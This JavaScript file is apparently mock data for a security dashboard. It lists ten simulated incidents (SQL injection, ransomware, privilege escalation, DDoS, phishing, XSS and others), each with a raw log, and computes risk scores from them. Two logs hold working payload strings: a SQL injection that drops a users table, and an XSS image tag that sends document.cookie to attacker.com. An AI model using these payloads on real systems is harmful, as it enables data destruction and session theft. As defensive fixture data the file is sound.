/**
 * SkyShield Realistic Security Events Dataset
 * Used by the Risk Engine and Incident Assistance modules.
 * Mapped to standardized Knowledge Base threat vectors.
 */

import { calculateRiskScore } from '../utils/riskCalculator';

export const initialSecurityEvents = [
  {
    id: "SEC-2026-101",
    threatId: "THREAT-002",
    threatName: "SQL Injection",
    eventType: "SQL_INJECTION",
    sourceIp: "194.26.29.114",
    targetResource: "aurora-db-customer-prod",
    cloudProvider: "AWS (us-east-1)",
    timestamp: "2026-11-20 17:42:15",
    metrics: {
      severity: 95,
      impact: 90,
      likelihood: 70
    },
    status: "Active",
    rawLog: "POST /api/v1/auth/login HTTP/1.1 500 - Payload: ' OR 1=1; DROP TABLE users;-- WAF Rule ID: CRS-942100",
    description: "Multi-vector SQL injection detected attempting to dump credentials from primary Aurora PostgreSQL cluster."
  },
  {
    id: "SEC-2026-102",
    threatId: "THREAT-010",
    threatName: "Ransomware",
    eventType: "RANSOMWARE_ACTIVITY",
    sourceIp: "10.0.4.88 (Internal Host)",
    targetResource: "nas-shared-vault-vol03",
    cloudProvider: "Azure (Central US)",
    timestamp: "2026-11-20 17:35:00",
    metrics: {
      severity: 98,
      impact: 95,
      likelihood: 75
    },
    status: "Active",
    rawLog: "Mass file rename detected: 4,210 files modified in 12s with .locked extension. vssadmin delete shadows invoked.",
    description: "Cryptovirology agent attempting rapid encryption of enterprise shared storage and backup snapshots."
  },
  {
    id: "SEC-2026-103",
    threatId: "THREAT-007",
    threatName: "Privilege Escalation",
    eventType: "PRIVILEGE_ESCALATION",
    sourceIp: "172.31.18.204 (Container)",
    targetResource: "k8s-worker-node-04b",
    cloudProvider: "AWS (eu-central-1)",
    timestamp: "2026-11-20 17:15:22",
    metrics: {
      severity: 92,
      impact: 88,
      likelihood: 60
    },
    status: "Investigating",
    rawLog: "Container 'payment-gateway-app' spawned interactive bash shell with UID 0 (root). Dirty Pipe vulnerability exploit signature matched.",
    description: "Low-privileged container process bypassed namespace boundary to gain root host access on worker node."
  },
  {
    id: "SEC-2026-104",
    threatId: "THREAT-006",
    threatName: "DDoS Attack",
    eventType: "DDOS_FLOOD",
    sourceIp: "Distributed Botnet (3,420 IPs)",
    targetResource: "edge-ingress-loadbalancer",
    cloudProvider: "Cloudflare / GCP",
    timestamp: "2026-11-20 16:50:40",
    metrics: {
      severity: 85,
      impact: 80,
      likelihood: 80
    },
    status: "Contained",
    rawLog: "HTTP SYN-flood flood peaking at 48.2 Gbps and 1.8M RPS targeting /api/search endpoint. Upstream latency 8,420ms.",
    description: "Volumetric L7 flood attack saturating edge load balancers, causing partial request drop timeouts."
  },
  {
    id: "SEC-2026-105",
    threatId: "THREAT-001",
    threatName: "Brute Force Attack",
    eventType: "FAILED_LOGIN",
    sourceIp: "185.220.101.5 (Tor Exit)",
    targetResource: "iam-admin-sso-gateway",
    cloudProvider: "AWS (Global)",
    timestamp: "2026-11-20 16:22:11",
    metrics: {
      severity: 75,
      impact: 68,
      likelihood: 85
    },
    status: "Active",
    rawLog: "820 failed authentication attempts in 3 minutes across 45 unique usernames targeting Okta SSO portal.",
    description: "Automated credential-stuffing dictionary attack targeting corporate cloud administrator accounts."
  },
  {
    id: "SEC-2026-106",
    threatId: "THREAT-008",
    threatName: "Unauthorized Access",
    eventType: "UNAUTHORIZED_ACCESS",
    sourceIp: "45.142.122.9",
    targetResource: "s3-confidential-finance-docs",
    cloudProvider: "AWS (us-east-2)",
    timestamp: "2026-11-20 15:45:19",
    metrics: {
      severity: 82,
      impact: 80,
      likelihood: 65
    },
    status: "Investigating",
    rawLog: "Anonymous API GetObject invoked on private bucket 's3-confidential-finance-docs'. Bucket policy misconfiguration detected.",
    description: "External unauthorized IP accessed internal financial audit archives via improperly configured IAM bucket policy."
  },
  {
    id: "SEC-2026-107",
    threatId: "THREAT-005",
    threatName: "Malware",
    eventType: "MALWARE_DETECTED",
    sourceIp: "10.0.12.50",
    targetResource: "build-runner-vm-02",
    cloudProvider: "GCP (us-central1)",
    timestamp: "2026-11-20 15:10:05",
    metrics: {
      severity: 88,
      impact: 82,
      likelihood: 62
    },
    status: "Investigating",
    rawLog: "CrowdStrike Falcon detected XMRig Monero miner daemon spawned from /tmp/.cache/xmrig. High CPU utilization (99.8%).",
    description: "Cryptomining binary executed on CI/CD build runner following compromised NPM package build hook."
  },
  {
    id: "SEC-2026-108",
    threatId: "THREAT-004",
    threatName: "Phishing",
    eventType: "PHISHING_ACTIVITY",
    sourceIp: "198.51.100.82",
    targetResource: "workspace-corporate-mail",
    cloudProvider: "Google Workspace",
    timestamp: "2026-11-20 14:30:18",
    metrics: {
      severity: 70,
      impact: 72,
      likelihood: 78
    },
    status: "Contained",
    rawLog: "Executive impersonation email bypassing SPF from 'ceo@skyshield-portal-verify.com'. 3 users clicked embedded link.",
    description: "Spearphishing campaign targeting HR and finance personnel with deceptive cloud credentials verification portal."
  },
  {
    id: "SEC-2026-109",
    threatId: "THREAT-003",
    threatName: "Cross-Site Scripting (XSS)",
    eventType: "XSS_ATTACK",
    sourceIp: "103.251.167.20",
    targetResource: "skyshield-customer-portal",
    cloudProvider: "Vercel / AWS",
    timestamp: "2026-11-20 13:15:40",
    metrics: {
      severity: 60,
      impact: 55,
      likelihood: 58
    },
    status: "Resolved",
    rawLog: "Reflected XSS string `<img src=x onerror=fetch('http://attacker.com?c='+document.cookie)>` sanitized by CSP edge header.",
    description: "Client-side script injection payload detected in support ticket comments form, neutralized by CSP policy."
  },
  {
    id: "SEC-2026-110",
    threatId: "THREAT-009",
    threatName: "Man-in-the-Middle Attack",
    eventType: "NETWORK_INTERCEPTION",
    sourceIp: "192.168.1.1 (Gateway)",
    targetResource: "remote-worker-vpn-pool",
    cloudProvider: "Enterprise VPN",
    timestamp: "2026-11-20 11:20:10",
    metrics: {
      severity: 68,
      impact: 62,
      likelihood: 45
    },
    status: "Resolved",
    rawLog: "ARP cache poisoning alert: Duplicate MAC address claiming IP of default gateway on subnet 192.168.1.0/24.",
    description: "Adversary attempted ARP spoofing on corporate branch office network to intercept unencrypted internal VoIP streams."
  }
];

// Pre-compute risk scores for the mock events using the official formula
export const securityEvents = initialSecurityEvents.map(event => ({
  ...event,
  riskScore: calculateRiskScore(
    event.metrics.severity,
    event.metrics.impact,
    event.metrics.likelihood
  )
}));

export default securityEvents;
